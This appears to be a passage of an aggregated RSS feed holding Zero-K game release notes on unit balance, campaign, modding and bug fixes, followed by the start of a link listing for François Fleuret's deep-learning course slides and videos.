<p><strong>Phoenix</strong> is heavier and deals more damage over a longer run.</p><ul>
<li>
Cost 360 -&gt; 460</li>
<li>
Health 1060 -&gt; 1450 (90 more than if just scaling by cost)</li>
<li>
Reduced turn rate slightly</li>
<li>
Rearm time 5s -&gt; 8s</li>
<li>
Drops 15 -&gt; 18 bombs over 0.93 -&gt; 1.7 seconds</li>
<li>
Area of Effect 216 -&gt; 320</li>
<li>
Damage per bomb 25 -&gt; 40</li>
<li>
Burn time 10s -&gt; 12s</li>
</ul>
<p><strong>Krow</strong> manoeuvrers a bit better and fires beam lasers with more damage.</p><ul>
<li>
Improved brake rate by 25%.</li>
<li>
Pew pew lasers replaced with burst beam lasers.</li>
<li>
Damage increased by 22%</li>
</ul>
<p><strong>Raptor</strong> is more manoeuvrable and slightly more deadly.</p><ul>
<li>
Increased turn rate while firing, to counteract the effect of slowing down.</li>
<li>
Firing cone angle 90 degrees -&gt; 100 degrees</li>
<li>
Damage increased by 4.2%</li>
</ul>
<p><strong>Locust</strong> is a tiny bit better as raiding, as a great Locust is scary.</p><ul>
<li>
Speed 207 -&gt; 212</li>
<li>
DPS increased by 2.5%</li>
</ul>
<p><strong>Thunderbird</strong> is slightly healthier.</p><ul>
<li>
Health 1120 -&gt; 1200</li>
</ul>
<h2><a name="Balance_Changes"></a>Balance Changes</h2><p><strong>Bolas</strong> has 4.5% more DPS and can 1-shot Flea.</p><ul>
<li>
Reload 0.366 -&gt; 0.433</li>
<li>
Damage 34 -&gt; 42</li>
</ul>
<p><strong>Ravager</strong> is tankier.</p><ul>
<li>
Health 2000 -&gt; 2200</li>
</ul>
<p><strong>Knight</strong> is a bit tankier.</p><ul>
<li>
Health 2400 -&gt; 2500</li>
</ul>
<p><strong>Hermit</strong> is tankier <em>and</em> faster.</p><ul>
<li>
Health 1500 -&gt; 1550</li>
<li>
Speed 51 -&gt; 54</li>
</ul>
<p><strong>Skuttle</strong> can survive a single Jack poke.</p><ul>
<li>
Health 250 -&gt; 380</li>
</ul>
<p><strong>Zephyr</strong> is also tankier, and now has missiles.</p><ul>
<li>
Health 1900 -&gt; 2200</li>
<li>
Replaced its front laser turret with missiles.</li>
<li>
Missile damage 72 x 2</li>
<li>
Reload time 1.6 seconds</li>
<li>
Range 1000 (same as lasers)</li>
<li>
The missiles have 30% less DPS, but fire in a burst.</li>
</ul>
<p><strong>Disco Rave Party</strong> has an interpolation of its May spin rate nerfs.</p><ul>
<li>
Aim speed 4 -&gt; 2.5 -&gt; 3 degrees/s.</li>
<li>
Spin up time 60 -&gt; 120 -&gt; 90 seconds.</li>
<li>
Spin drop while turning is unchanged, but less spin is lost for any given turn due to the increased turn rate.</li>
</ul>
<h2><a name="Campaign"></a>Campaign</h2><ul>
<li>
Magpie is unlocked on Fel Diacia (the Thunderbird mission) and Odin is unlocked on Bavhakya (the Likho mission). Anyone with these missions complete will have their units unlocked.</li>
<li>
Added a Records tab to the Profile menu on the campaign screen. This screen can sort and display your victories with least units lost, in the shortest time, with bonus objectives and difficulties. Unfortunately the data is not retroactive.</li>
<li>
Removed a few Lucifers from easier difficulties on Onsally (the Phoenix mission).</li>
<li>
Worked around the Dominatrix build options bug for the Rover Assembly on Ganong (the Dominatrix mission).</li>
<li>
Clarified Lalata main objective text (the Jugglenaut mission).</li>
</ul>
<h2><a name="Features"></a>Features</h2><ul>
<li>
Added Units Lost to endgame graphs.</li>
<li>
Unit pictures for bombers now have an icon showing whether it is ready to fire.</li>
<li>
Aircraft now smoothly glide and stop when landing on airpads. This is technically a nerf as they take slightly longer to land.</li>
<li>
Improved shotgun visuals, with minor balance implications.</li>
<li>
Grizzly now aims smoothly and holds its gun steady as it fires.</li>
<li>
Tweaked the automatic handicap mode to give lower handicaps for ratings above 2000.</li>
<li>
Moved Raptor to the AA slot (D) of the Airplane Plant and Sparrow to secondary scout/raider (S).</li>
<li>
Taught the opponent AI about Magpie.</li>
</ul>
<h2><a name="Modding"></a>Modding</h2><ul>
<li>
Units can now be tinted, rescaled and made glowing via the customparams model_tint ("R G B"), model_glow ("R G B A"), and model_rescale. Colour values are from 0 to 1.</li>
<li>
Free units (0 metal and energy cost) no longer need to explicitly specify a non-zero buildtime (previous release).</li>
<li>
Added a function to effects/napalm for generating generic fireballs ala Inferno.</li>
<li>
Air pads now call ReammoComplete, if it is a units script, when bombers are rearmed.</li>
<li>
Added command AIR_MANUALFIRE for aircraft, since they cannot use the in-engine type.</li>
</ul>
<h2><a name="Fixes"></a>Fixes</h2><ul>
<li>
Fixed Tremor wheels not spinning.</li>
<li>
Gravity guns push and pull a bit more consistently.</li>
<li>
Jack can no longer pretend to be a missile in enemy Missile Silos.</li>
<li>
Slow damage makes shields charge slower again (it broke at some point)</li>
<li>
Fixed bombers sometimes seeming to ignore a move command.</li>
<li>
Attack Move on bombers is now is now removed after they shoot, unless the bomber is set to repeat. Previously this only worked for some bombers.</li>
<li>
Bombers are now much better at landing on Reef. Much better. Horrific things could happen before.</li>
<li>
Fix sun on Mercurial and Rogues River.</li>
</ul>
<br></div>
            <p><small>
                Posted by <img src="https://zero-k.info/img/flags/AU.png" height="11" width="16" alt="AU"><img src="https://zero-k.info/img/ranks/7_7.png" alt="rank"><a href="https://zero-k.info/Clans/Detail/876" nicetitle="$clan$876"><img src="https://zero-k.info/img/clans/RSN.png" width="16"></a><img src="https://zero-k.info/img/police.png" alt="Admin"><a href="https://zero-k.info/Users/Detail/15114" nicetitle="$user$15114">GoogleFrog</a> 30 hours ago - <a href="https://zero-k.info/Forum/Thread/37015">comment</a>
            </small></p><h2>Zero-K v1.11.10.0</h2>
            <div><p>This is a hotfix release for an engine bug that could be used to place geos anywhere.</p><h2><a name="Modding"></a>Modding</h2><br> <ul>
<li>
Units can now be tinted, rescaled and made glowing via customparams:</li>
</ul>
<pre>model_tint = "1.0  0.5  0.0" -- R G B
model_glow = "0.1  0.2  0.3  1.0" -- R G B A
model_rescale = 1.23,
</pre><br> <ul>
<li>
Free units (0 metal and energy cost) no longer need to explicitly specify a non-zero buildtime.</li>
<li>
Support some recently added engine interfaces, see `engine_compat.lua`. Note that ZK hasn't yet migrated.</li>
</ul>
<br><h2><a name="Fixes"></a>Fixes</h2><br> <ul>
<li>
Fix an exploit to do with geo placement.</li>
<li>
Fix the "Enable Force Fire Command" default state for Lobster.</li>
<li>
Fix Dominatrix breaking when capturing very low completion nanoframes of very expensive units.</li>
<li>
Fix awards for sharing and capture to consider nanoframes at their real value.</li>
<li>
Fix a chat crash if using the "color labels the player colour" option.</li>
<li>
Fix Onyx Cauldron using incorrect boxes in coop comp stomps.</li>
<li>
Fix cloaked constructors revealing themselves by reclaiming if using the automated constructors widget.</li>
<li>
Land units now eventually give up when ordered to move deep into an inaccessible place (such as a large sea).</li>
</ul>
</div>
            <p><small>
                Posted by <img src="https://zero-k.info/img/flags/AU.png" height="11" width="16" alt="AU"><img src="https://zero-k.info/img/ranks/7_7.png" alt="rank"><a href="https://zero-k.info/Clans/Detail/876" nicetitle="$clan$876"><img src="https://zero-k.info/img/clans/RSN.png" width="16"></a><img src="https://zero-k.info/img/police.png" alt="Admin"><a href="https://zero-k.info/Users/Detail/15114" nicetitle="$user$15114">GoogleFrog</a> 33 days ago - <a href="https://zero-k.info/Forum/Thread/36867">comment</a>
            </small></p><h2>Zero-K v1.11.8.1 - Lobster Brained</h2>
                <p><a href="https://zero-k.info/img/news/3348.png"><img src="https://zero-k.info/img/news/3348_thumb.png"></a></p><div><p>Lobsters have been taught to not fire when it would be redundant, making Lobster balls much easier to manage. Overkill prevention in general has a tweak, and some APIs were extended to make modding easier. The Artefact Control game mode which saw some testing about a month ago is now live. In terms of balance, Redback has a bit of a nerf and some of the least used units - Skuttle, Phoenix and Emissary - have small buffs.</p><h2><a name="Balance"></a>Balance</h2><p><strong>Duck </strong>can now be dodged by a Glaive trying as hard as it can to run away.</p><ul>
<li>
Missile fuel time 2s -&gt; 1.5s</li>
</ul>
<p><strong>Redback </strong>is worse at taking map control and assaulting defenses.</p><ul>
<li>
Cost 230 -&gt; 240</li>
<li>
Speed 1.85 -&gt; 1.75</li>
</ul>
<p><strong>Skuttle </strong>can see enemies before they break its cloak.</p><ul>
<li>
Line of sight 280 -&gt; 330</li>
</ul>
<p><strong>Emissary</strong> aims faster and no longer benefits from manually turning.</p><ul>
<li>
Body turn rate reduced 105 -&gt; 84 degrees/second</li>
<li>
Gun aim rate increased 40 -&gt; 70 degrees/second</li>
<li>
Resets its gun between shots (as much as possible) in case it has to move.</li>
</ul>
<p><strong>Phoenix </strong>moves faster and hits its target sooner.</p><ul>
<li>
Speed 8 -&gt; 8.1</li>
<li>
Projectile gravity 0.7 -&gt; 0.72</li>
</ul>
<br><h2><a name="Unit_AI"></a>Unit AI</h2><p>Overkill prevention, the system that prevents ten Scalpels firing at a single Glaive, is now available for Lobster and disabled for units set to hold. It is controlled by a state toggle that is hidden by default because there is very little reason to touch it. The state toggle can be enabled under Settings/Interface/Commands, and per-unit defaults to be set in Settings/Unit Behaviour/Default States, or by holding Space and clicking on a unit, then pressing Edit Behaviour.</p><p><strong>Lobster </strong>is smarter, no longer firing unless there is a visible valid target.</p><ul>
<li>
This prevents it from firing when it would do absolutely nothing, provided there are no invisible enemies nearby.</li>
<li>
As a result, telling a tight clump of Lobsters to fire causes only two to shoot.</li>
<li>
This behaviour can be configured with the hidden Overkill Prevention state.</li>
<li>
Removed the Force Fire command by default. This can be configured via another hidden state toggle.</li>
</ul>
<p><strong>Overkill prevention</strong> is now suspended by default when units are set to Hold Fire.</p><ul>
<li>
Added the "Enable for Fire at Will" and "Enable for auto targeting" states. Previously it just had enabled/disabled.</li>
<li>
Most units default to "Enable for Fire at Will". The theory being that if you set a unit to hold fire you care more about its target dying than about overkill.</li>
<li>
Nothing defaults to "Enable for auto targeting", but it may be useful to try out.</li>
</ul>
<p><strong>Impaler</strong> now has an even stronger preference for targeting structures over units.</p><h2><a name="Interface"></a>Interface</h2><br> <ul>
<li>
Added a minimum wind icon and number to the left column of the wind generator tooltip during placement (thanks Porkchop)</li>
<li>
Cleaned up some inconsistent unit highlighting and selection. Units under interface panels cannot be clicked on by default, tooltips do not appear, and units are not highlighted.</li>
<li>
Selecting through the panel at the bottom of the screen can be configured under Settings/HUD Panels/Selected Units Panel.</li>
<li>
Drag selection can still terminate over a UI panel.</li>
<li>
Add some translations for the commander selector.</li>
<li>
Updated Global Build AI with some fixes and documentation (thanks esainane).</li>
<li>
Added username team colour in chat and removed white outlines for dark names (thanks Birdulon)</li>
<li>
Local widgets are no longer disabled for spectators on rooms with local widgets disabled.</li>
<li>
Added Italian translations for the main menu (thanks fvasco)</li>
</ul>
<br><h2><a name="Campaign"></a>Campaign</h2><br> <ul>
<li>
Tweaked campaign text and replaced some Artefacts with more suitable structures (thanks Thorneel)</li>
</ul>
<br><h2><a name="Maps"></a>Maps</h2><br> <ul>
<li>
Added boxes for Onyx Cauldron 2.0</li>
<li>
Improved lighting on Skulduggery (thanks Shaman)</li>
<li>
Improved water on Cull, Lost v2 and Lowland Crossing Revised v2.</li>
<li>
Fixed an issue with void water with new shaders on some graphics cards.</li>
</ul>
<br><h2><a name="Artefact_Control"></a>Artefact Control</h2><p>Added a control point game mode called Artefact Control under Experimental.</p><ul>
<li>
Several artefacts are spawned on each side of the map.</li>
<li>
Each team controls half at the start of the game.</li>
<li>
Artefacts have 11k health and heal at 100 hp/second.</li>
<li>
Artefacts respawned with switched allegeance when destroyed.</li>
<li>
If a team controlls all the artefacts, they win.</li>
</ul>
<br><h2><a name="Modding"></a>Modding</h2><p>Changed some keys in unit def files to match the lua UnitDefs table. Mods with the old keys are still supported.</p><ul>
<li>
buildCostMetal -&gt; metalCost</li>
<li>
buildCostEnergy -&gt; energyCost</li>
<li>
energyUse -&gt; energyUpkeep</li>
<li>
metalUse -&gt; metalUpkeep (vanilla ZK doesn't use this)</li>
<li>
maxDamage -&gt; health</li>
<li>
maxVelocity -&gt; speed</li>
</ul>
<p>Other changes.</p><ul>
<li>
Unit defs no longer require unitname since it must match the table key, so it is redundant.</li>
<li>
Unit defs are now also read from subfolders of 'units'.</li>
<li>
Set undefined burst rates to 0 (rather than 0.1) as it can interfere with weapon modding.</li>
<li>
The game exits to menu when unit defs fail to load, rather than crashing.</li>
<li>
Added game-side GG.UnitModelRescale(unitID, scale) from Unit Level Ups.</li>
<li>
Added backwards compatibility for Spring.GetUnitIsBeingBuilt.</li>
<li>
Fixed backwards compatibility for Spring.GetPlayerRulesParams.</li>
<li>
Added customparams.buggeroff_angle for factories, in radians.</li>
<li>
Added customparams.metal_extractor_mult to support the creation of higher tier metal extractors.</li>
<li>
Fixed modding away the Sniper reload move penalty breaking the script.</li>
<li>
Cleaned up the build icon generator gadget.</li>
<li>
Napalm effects now contain an example of sin (replaces taylor series).</li>
<li>
Improved modded energy generator tooltips.</li>
<li>
Mexes suport morphing.</li>
</ul>
<br><h2><a name="Fixes"></a>Fixes</h2><br> <ul>
<li>
Fixed commshare sometimes preventing resign or causing a crash when the game ends.</li>
<li>
War music no longer counts morph as violence.</li>
<li>
Fixed missing vote resign button.</li>
<li>
Marginal turret overshoot can no longer be circumvented with command insert.</li>
<li>
Fixed a few build icons incorrectly implying that a floating structure is built underwater.</li>
<li>
Fixed commander selector button image.</li>
<li>
Fixed backwards 'motion blur' on ejected shells.</li>
<li>
Fixed some large structure wreckages having much too large collision volumes.</li>
</ul>
</div>
            <p><small>
                Posted by <img src="https://zero-k.info/img/flags/AU.png" height="11" width="16" alt="AU"><img src="https://zero-k.info/img/ranks/7_7.png" alt="rank"><a href="https://zero-k.info/Clans/Detail/876" nicetitle="$clan$876"><img src="https://zero-k.info/img/clans/RSN.png" width="16"></a><img src="https://zero-k.info/img/police.png" alt="Admin"><a href="https://zero-k.info/Users/Detail/15114" nicetitle="$user$15114">GoogleFrog</a> 2 months ago - <a href="https://zero-k.info/Forum/Thread/36720">comment</a>
            </small></p><h2>Zero-K v1.11.6.5 - Sudden Death</h2>
            <div><p>This is mostly a small fixes update for the previous patch. It has a few balance chanegs and features though. Most notable are a slight Redback nerf and a sudden death mode. The sudden death mode might see use in the upcoming tournament to put a cap on very long games, but we are still waiting to see what people think of it. In any case, it seems like a useful mode to have.</p><h2><a name="Balance"></a>Balance</h2><p><strong>Redback</strong> is worse at dodging projectiles.</p><ul>
<li>
Increased collision shape width by 11% and length by 25%.</li>
<li>
Reduced turn rate by 5%.</li>
</ul>
<p><strong>Ogre</strong> now ignores terrain and wrecks when aiming and firing. It has sufficient AoE and arc for making the attempt to often be beneficial.</p><p><strong>Zeno</strong> now homes onto the actual position of a radar target earlier - early enough to hit it.</p><h2><a name="Features"></a>Features</h2><br> <ul>
<li>
Holding Alt while selecting units now filters out rank 3 (ie army units).</li>
<li>
Added a sudden death mode game option, under Map. It causes the game to end shortly after a specified time via a contracting death circle.</li>
</ul>
<br><h2><a name="Fixes"></a>Fixes</h2><br> <ul>
<li>
Fixed a missile impact indicator error.</li>
<li>
Fixed a pathfinding issue to do with construction orders on terrible terrain.</li>
<li>
Tactical missiles no longer have inconsistent half-prediction of enemy velocity. They now fire exactly where they are aimed.</li>
<li>
Fixed contrast adaptive sharpening scaling with zoom level.</li>
<li>
Fixed moderator tooltip colour in the lobby.</li>
<li>
Improved Pylon collision and selection volumes.</li>
</ul>
</div>
            <p><small>
                Posted by <img src="https://zero-k.info/img/flags/AU.png" height="11" width="16" alt="AU"><img src="https://zero-k.info/img/ranks/7_7.png" alt="rank"><a href="https://zero-k.info/Clans/Detail/876" nicetitle="$clan$876"><img src="https://zero-k.info/img/clans/RSN.png" width="16"></a><img src="https://zero-k.info/img/police.png" alt="Admin"><a href="https://zero-k.info/Users/Detail/15114" nicetitle="$user$15114">GoogleFrog</a> 4 months ago - <a href="https://zero-k.info/Forum/Thread/36547">comment</a>
            </small></p><p>
        <a href="https://zero-k.info/News"><img src="https://zero-k.info/img/rss.png" width="25" alt="rss"> RSS feed</a> | <a href="https://zero-k.info/Forum?categoryID=13">news archive</a></p></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Deep Learning Course (365 pts)]]></title>
            <link>https://fleuret.org/dlc/</link>
            <guid>38331200</guid>
            <pubDate>Sun, 19 Nov 2023 10:19:21 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://fleuret.org/dlc/">https://fleuret.org/dlc/</a>, See on <a href="https://news.ycombinator.com/item?id=38331200">Hacker News</a></p>
<div id="readability-page-1" class="page">

<!-- ************************************************************ -->
<!-- ************************************************************ -->
<!-- ************************************************************ -->

<h2>Deep Learning Course</h2>

<p>You can find here <a href="#lectures">slides, recordings</a>,
and a <a href="#vm">virtual machine</a>
for <a href="https://fleuret.org/francois/">François
Fleuret</a>'s deep-learning
courses <a href="https://wwwi.unige.ch/cursus/programme-des-cours/web/teachings/details/2020-14X050">14x050</a>
of the <a href="https://www.unige.ch/">University of Geneva,</a>
<!-- and <a href="https://edu.epfl.ch/coursebook/en/deep-learning-EE-559">EE-559</a> -->
<!-- of the <a href="https://www.epfl.ch/index.en.html">École -->
<!-- Polytechnique Fédérale de Lausanne,</a> -->
Switzerland.</p>

<p>This course is a thorough introduction to deep-learning, with
examples in the <a href="https://pytorch.org/">PyTorch</a>
framework:</p>

<ul>
<li>machine learning objectives and main challenges,</li>
<li>tensor operations,</li>
<li>automatic differentiation, gradient descent,</li>
<li>deep-learning specific techniques,</li>
<li>generative, recurrent, attention models.</li>
</ul>

<p>You can check the <a href="#information">pre-requisites.</a></p>

<!-- ********************************************************************** -->

<p>This course was developped initialy at
the <a href="https://www.idiap.ch/">Idiap Research Institute</a>
in 2018, and taught as EE-559
at <a href="https://www.epfl.ch/index.en.html">École
Polytechnique Fédérale de Lausanne</a> until 2022. The notes for
the handouts were added with the help
of <a href="https://www.idiap.ch/~ocanevet/">Olivier
Canévet.</a></p>

<p>Thanks to Adam Paszke, Jean-Baptiste Cordonnier, Alexandre
Nanchen, Xavier Glorot, Andreas Steiner, Matus Telgarsky,
Diederik Kingma, Nikolaos Pappas, Soumith Chintala, and Shaojie
Bai for their answers or comments.</p>

<!-- ************************************************************ -->
<!-- ************************************************************ -->
<!-- ************************************************************ -->

<p>In addition to the materials available here, I also wrote and
distribute <a href="https://fleuret.org/francois/lbdl.html">"The Little Book of Deep Learning",</a> a
phone-formatted short introduction to deep learning for readers with a
STEM background.</p>

<h2><a id="lectures"></a>Lecture materials</h2>

<p>The slide pdfs are the ones I use for the lectures. They are in
landscape format with overlays to facilitate the presentation. The
handout pdfs are compiled without these fancy effects in portrait
orientation, with additional notes. The screencasts are available both
as in-browser streaming or downloadable mp4 files.</p>

<p>You can get archives with all the pdf files
(1097 slides):</p>

<ul>
<li><a href="https://fleuret.org/dlc/materials/dlc-handout-all.zip">dlc-handout-all.zip</a> (101.6Mb)</li>
<li><a href="https://fleuret.org/dlc/materials/dlc-slides-all.zip">dlc-slides-all.zip</a> (101.6Mb)</li>
</ul>

<p>and subtitles for the screencasts generated automaticallly
with <a href="https://github.com/openai/whisper">OpenAI's
Whisper</a>:</p>
<ul>
<li> <a href="https://fleuret.org/dlc/materials/dlc-video-subtitles.zip">dlc-video-subtitles.zip</a>
(502.1Kb)</li>
</ul>

<p>or the individual lectures:</p>

<ul>
  <li><a id="lecture-1"></a>1. Introduction. (90 slides, 1h57min videos)
  <img src="https://fleuret.org/dlc/pics/thumb-1.png" alt="Icon made from one of the slides">
    <table>
    <tbody><tr>
      <td>1.1.</td><td>From neural networks to deep learning. (18 slides, 26min video)</td>
    </tr>
    <tr>
      <td></td>
      <td><a href="https://fleuret.org/dlc/materials/dlc-handout-1-1-from-anns-to-deep-learning.pdf">handout</a>
      (<a href="https://fleuret.org/dlc/materials/dlc-slides-1-1-from-anns-to-deep-learning.pdf">slides</a>),
      <a href="https://fleuret.org/dlc/streaming/dlc-video-1-1-from-anns-to-deep-learning.mp4">stream</a>
      (<a href="https://fleuret.org/dlc/videos/dlc-video-1-1-from-anns-to-deep-learning.mp4">mp4</a>).</td>
    </tr>
    <tr>
      <td>1.2.</td><td>Current applications and success. (25 slides, 29min video)</td>
    </tr>
    <tr>
      <td></td>
      <td><a href="https://fleuret.org/dlc/materials/dlc-handout-1-2-current-success.pdf">handout</a>
      (<a href="https://fleuret.org/dlc/materials/dlc-slides-1-2-current-success.pdf">slides</a>),
      <a href="https://fleuret.org/dlc/streaming/dlc-video-1-2-current-success.mp4">stream</a>
      (<a href="https://fleuret.org/dlc/videos/dlc-video-1-2-current-success.mp4">mp4</a>).</td>
    </tr>
    <tr>
      <td>1.3.</td><td>What is really happening? (10 slides, 11min video)</td>
    </tr>
    <tr>
      <td></td>
      <td><a href="https://fleuret.org/dlc/materials/dlc-handout-1-3-what-is-happening.pdf">handout</a>
      (<a href="https://fleuret.org/dlc/materials/dlc-slides-1-3-what-is-happening.pdf">slides</a>),
      <a href="https://fleuret.org/dlc/streaming/dlc-video-1-3-what-is-happening.mp4">stream</a>
      (<a href="https://fleuret.org/dlc/videos/dlc-video-1-3-what-is-happening.mp4">mp4</a>).</td>
    </tr>
    <tr>
      <td>1.4.</td><td>Tensor basics and linear regression. (13 slides, 21min video)</td>
    </tr>
    <tr>
      <td></td>
      <td><a href="https://fleuret.org/dlc/materials/dlc-handout-1-4-tensors-and-linear-regression.pdf">handout</a>
      (<a href="https://fleuret.org/dlc/materials/dlc-slides-1-4-tensors-and-linear-regression.pdf">slides</a>),
      <a href="https://fleuret.org/dlc/streaming/dlc-video-1-4-tensors-and-linear-regression.mp4">stream</a>
      (<a href="https://fleuret.org/dlc/videos/dlc-video-1-4-tensors-and-linear-regression.mp4">mp4</a>).</td>
    </tr>
    <tr>
      <td>1.5.</td><td>High dimension tensors. (20 slides, 25min video)</td>
    </tr>
    <tr>
      <td></td>
      <td><a href="https://fleuret.org/dlc/materials/dlc-handout-1-5-high-dimension-tensors.pdf">handout</a>
      (<a href="https://fleuret.org/dlc/materials/dlc-slides-1-5-high-dimension-tensors.pdf">slides</a>),
      <a href="https://fleuret.org/dlc/streaming/dlc-video-1-5-high-dimension-tensors.mp4">stream</a>
      (<a href="https://fleuret.org/dlc/videos/dlc-video-1-5-high-dimension-tensors.mp4">mp4</a>).</td>
    </tr>
    <tr>
      <td>1.6.</td><td>Tensor internals. (4 slides, 6min video)</td>
    </tr>
    <tr>
      <td></td>
      <td><a href="https://fleuret.org/dlc/materials/dlc-handout-1-6-tensor-internals.pdf">handout</a>
      (<a href="https://fleuret.org/dlc/materials/dlc-slides-1-6-tensor-internals.pdf">slides</a>),
      <a href="https://fleuret.org/dlc/streaming/dlc-video-1-6-tensor-internals.mp4">stream</a>
      (<a href="https://fleuret.org/dlc/videos/dlc-video-1-6-tensor-internals.mp4">mp4</a>).</td>
    </tr>
    </tbody></table>
  </li>

  <li><a id="lecture-2"></a>2. Machine learning fundamentals. (72 slides, 1h44min videos)
  <img src="https://fleuret.org/dlc/pics/thumb-2.png" alt="Icon made from one of the slides">
    <table>
    <tbody><tr>
      <td>2.1.</td><td>Loss and risk. (12 slides, 20min video)</td>
    </tr>
    <tr>
      <td></td>
      <td><a href="https://fleuret.org/dlc/materials/dlc-handout-2-1-loss-and-risk.pdf">handout</a>
      (<a href="https://fleuret.org/dlc/materials/dlc-slides-2-1-loss-and-risk.pdf">slides</a>),
      <a href="https://fleuret.org/dlc/streaming/dlc-video-2-1-loss-and-risk.mp4">stream</a>
      (<a href="https://fleuret.org/dlc/videos/dlc-video-2-1-loss-and-risk.mp4">mp4</a>).</td>
    </tr>
    <tr>
      <td>2.2.</td><td>Over and under fitting. (25 slides, 36min video)</td>
    </tr>
    <tr>
      <td></td>
      <td><a href="https://fleuret.org/dlc/materials/dlc-handout-2-2-overfitting.pdf">handout</a>
      (<a href="https://fleuret.org/dlc/materials/dlc-slides-2-2-overfitting.pdf">slides</a>),
      <a href="https://fleuret.org/dlc/streaming/dlc-video-2-2-overfitting.mp4">stream</a>
      (<a href="https://fleuret.org/dlc/videos/dlc-video-2-2-overfitting.mp4">mp4</a>).</td>
    </tr>
    <tr>
      <td>2.3.</td><td>Bias-variance dilemma. (10 slides, 18min video)</td>
    </tr>
    <tr>
      <td></td>
      <td><a href="https://fleuret.org/dlc/materials/dlc-handout-2-3-bias-variance-dilemma.pdf">handout</a>
      (<a href="https://fleuret.org/dlc/materials/dlc-slides-2-3-bias-variance-dilemma.pdf">slides</a>),
      <a href="https://fleuret.org/dlc/streaming/dlc-video-2-3-bias-variance-dilemma.mp4">stream</a>
      (<a href="https://fleuret.org/dlc/videos/dlc-video-2-3-bias-variance-dilemma.mp4">mp4</a>).</td>
    </tr>
    <tr>
      <td>2.4.</td><td>Proper evaluation protocols. (6 slides, 11min video)</td>
    </tr>
    <tr>
      <td></td>
      <td><a href="https://fleuret.org/dlc/materials/dlc-handout-2-4-evaluation-protocols.pdf">handout</a>
      (<a href="https://fleuret.org/dlc/materials/dlc-slides-2-4-evaluation-protocols.pdf">slides</a>),
      <a href="https://fleuret.org/dlc/streaming/dlc-video-2-4-evaluation-protocols.mp4">stream</a>
      (<a href="https://fleuret.org/dlc/videos/dlc-video-2-4-evaluation-protocols.mp4">mp4</a>).</td>
    </tr>
    <tr>
      <td>2.5.</td><td>Basic clusterings and embeddings. (19 slides, 19min video)</td>
    </tr>
    <tr>
      <td></td>
      <td><a href="https://fleuret.org/dlc/materials/dlc-handout-2-5-basic-embeddings.pdf">handout</a>
      (<a href="https://fleuret.org/dlc/materials/dlc-slides-2-5-basic-embeddings.pdf">slides</a>),
      <a href="https://fleuret.org/dlc/streaming/dlc-video-2-5-basic-embeddings.mp4">stream</a>
      (<a href="https://fleuret.org/dlc/videos/dlc-video-2-5-basic-embeddings.mp4">mp4</a>).</td>
    </tr>
    </tbody></table>
  </li>

  <li><a id="lecture-3"></a>3. Multi-layer perceptron and back-propagation. (68 slides, 1h54min videos)
  <img src="https://fleuret.org/dlc/pics/thumb-3.png" alt="Icon made from one of the slides">
    <table>
    <tbody><tr>
      <td>3.1.</td><td>The perceptron. (16 slides, 28min video)</td>
    </tr>
    <tr>
      <td></td>
      <td><a href="https://fleuret.org/dlc/materials/dlc-handout-3-1-perceptron.pdf">handout</a>
      (<a href="https://fleuret.org/dlc/materials/dlc-slides-3-1-perceptron.pdf">slides</a>),
      <a href="https://fleuret.org/dlc/streaming/dlc-video-3-1-perceptron.mp4">stream</a>
      (<a href="https://fleuret.org/dlc/videos/dlc-video-3-1-perceptron.mp4">mp4</a>).</td>
    </tr>
    <tr>
      <td>3.2.</td><td>Probabilistic view of a linear classifier. (8 slides, 14min video)</td>
    </tr>
    <tr>
      <td></td>
      <td><a href="https://fleuret.org/dlc/materials/dlc-handout-3-2-LDA.pdf">handout</a>
      (<a href="https://fleuret.org/dlc/materials/dlc-slides-3-2-LDA.pdf">slides</a>),
      <a href="https://fleuret.org/dlc/streaming/dlc-video-3-2-LDA.mp4">stream</a>
      (<a href="https://fleuret.org/dlc/videos/dlc-video-3-2-LDA.mp4">mp4</a>).</td>
    </tr>
    <tr>
      <td>3.3.</td><td>Linear separability and feature design. (10 slides, 17min video)</td>
    </tr>
    <tr>
      <td></td>
      <td><a href="https://fleuret.org/dlc/materials/dlc-handout-3-3-features.pdf">handout</a>
      (<a href="https://fleuret.org/dlc/materials/dlc-slides-3-3-features.pdf">slides</a>),
      <a href="https://fleuret.org/dlc/streaming/dlc-video-3-3-features.mp4">stream</a>
      (<a href="https://fleuret.org/dlc/videos/dlc-video-3-3-features.mp4">mp4</a>).</td>
    </tr>
    <tr>
      <td>3.4.</td><td>Multi-Layer Perceptrons. (10 slides, 11min video)</td>
    </tr>
    <tr>
      <td></td>
      <td><a href="https://fleuret.org/dlc/materials/dlc-handout-3-4-MLP.pdf">handout</a>
      (<a href="https://fleuret.org/dlc/materials/dlc-slides-3-4-MLP.pdf">slides</a>),
      <a href="https://fleuret.org/dlc/streaming/dlc-video-3-4-MLP.mp4">stream</a>
      (<a href="https://fleuret.org/dlc/videos/dlc-video-3-4-MLP.mp4">mp4</a>).</td>
    </tr>
    <tr>
      <td>3.5.</td><td>Gradient descent. (13 slides, 24min video)</td>
    </tr>
    <tr>
      <td></td>
      <td><a href="https://fleuret.org/dlc/materials/dlc-handout-3-5-gradient-descent.pdf">handout</a>
      (<a href="https://fleuret.org/dlc/materials/dlc-slides-3-5-gradient-descent.pdf">slides</a>),
      <a href="https://fleuret.org/dlc/streaming/dlc-video-3-5-gradient-descent.mp4">stream</a>
      (<a href="https://fleuret.org/dlc/videos/dlc-video-3-5-gradient-descent.mp4">mp4</a>).</td>
    </tr>
    <tr>
      <td>3.6.</td><td>Back-propagation. (11 slides, 20min video)</td>
    </tr>
    <tr>
      <td></td>
      <td><a href="https://fleuret.org/dlc/materials/dlc-handout-3-6-backprop.pdf">handout</a>
      (<a href="https://fleuret.org/dlc/materials/dlc-slides-3-6-backprop.pdf">slides</a>),
      <a href="https://fleuret.org/dlc/streaming/dlc-video-3-6-backprop.mp4">stream</a>
      (<a href="https://fleuret.org/dlc/videos/dlc-video-3-6-backprop.mp4">mp4</a>).</td>
    </tr>
    </tbody></table>
  </li>

  <li><a id="lecture-4"></a>4. Graphs of operators, autograd, and convolutional layers. (86 slides, 1h36min videos)
  <img src="https://fleuret.org/dlc/pics/thumb-4.png" alt="Icon made from one of the slides">
    <table>
    <tbody><tr>
      <td>4.1.</td><td>DAG networks. (11 slides, 21min video)</td>
    </tr>
    <tr>
      <td></td>
      <td><a href="https://fleuret.org/dlc/materials/dlc-handout-4-1-DAG-networks.pdf">handout</a>
      (<a href="https://fleuret.org/dlc/materials/dlc-slides-4-1-DAG-networks.pdf">slides</a>),
